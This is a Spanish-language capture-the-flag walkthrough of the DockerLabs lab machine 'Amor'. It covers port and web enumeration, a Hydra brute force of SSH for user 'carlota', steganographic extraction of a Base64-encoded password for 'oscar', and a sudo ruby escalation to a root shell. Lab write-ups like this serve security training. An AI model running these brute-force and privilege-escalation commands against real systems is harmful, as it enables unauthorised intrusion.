## Introducción

Este documento presenta la resolución completa de la máquina **Amor**, desarrollada por *Romabri* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web que contiene una pista sobre un usuario del sistema llamado `carlota`. Tras realizar un ataque de fuerza bruta contra el servicio SSH, se obtiene acceso al sistema como dicho usuario.
Una vez dentro, se encuentra una imagen con contenido oculto mediante esteganografía. Al extraer el archivo embebido y decodificarlo, se obtienen las credenciales del usuario `oscar`. Finalmente, se identifica una configuración insegura de `sudo` que permite ejecutar `ruby` como root, facilitando una escalada de privilegios inmediata hasta obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Amor.zip
sudo bash auto_deploy.sh Amor.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Amor/{content,exploits,nmap,scripts}
cd Amor
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762631007/Ports_zg6wpx.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

El escaneo no revela rutas adicionales relevantes. El único recurso accesible es el **index**:

![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762631006/Index_v0dqfz.png)

Analizando el código y contenido de la página, se identifica una pista directa sobre un usuario del sistema:

![Pista](https://res.cloudinary.com/dewqswzke/image/upload/v1762631006/Pista_cynqpy.png)

La mención al usuario **carlota** abre la posibilidad de un ataque de fuerza bruta sobre el servicio SSH.

---

## Paso 2 — Explotación (Acceso inicial)

Con un posible usuario identificado, se procede a realizar un ataque de fuerza bruta con Hydra:

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1762631006/Hydra_h4b6sr.png)

Hydra confirma credenciales válidas, permitiendo el acceso al sistema:

```bash
ssh carlota@172.17.0.2
```

![SSH login](https://res.cloudinary.com/dewqswzke/image/upload/v1762631008/Ssh_kee0cr.png)

## Paso 3 — Escalada de privilegios

### 3.1 De carlota → oscar

Se identifica una imagen sospechosa en:

```
/Desktop/fotos/vacaciones/imagen.jpg
```

![Imagen](https://res.cloudinary.com/dewqswzke/image/upload/v1762631006/Image_uh23xl.png)

La imagen se descarga para su análisis:

```bash
scp carlota@172.17.0.2:/Desktop/fotos/vacaciones/imagen.jpg /content
```

El análisis con `exiftool` no revela metadatos útiles. Luego se utiliza `steghide` para detectar contenido oculto:

```bash
steghide info imagen.jpg
```

![Steghide info](https://res.cloudinary.com/dewqswzke/image/upload/v1762631009/Steghide_h7t8ik.png)

Se extrae el archivo embebido:

![Secret.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1762631006/Imagen.out_nkj4kf.png)

El contenido aparece codificado en Base64, por lo que se decodifica:

```bash
echo "b3NjYXI6IDExODUyMw==" | base64 -d
```

![Decode Base64](https://res.cloudinary.com/dewqswzke/image/upload/v1762631006/Base64_ryrr2p.png)

Esto proporciona la contraseña del usuario **oscar**, permitiendo cambiar de usuario:

```bash
su oscar
```

![Su oscar](https://res.cloudinary.com/dewqswzke/image/upload/v1762631006/Oscar_dothaz.png)

### 3.2 De oscar → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Oscar sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762631009/Sudo-l_dsqmhp.png)

El usuario **oscar** puede ejecutar `ruby` como root sin necesidad de contraseña.

Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins:

```bash
searchbins -b ruby -f sudo
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo ruby -e 'exec "/bin/sh"'
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762631008/Root_mzt3af.png)
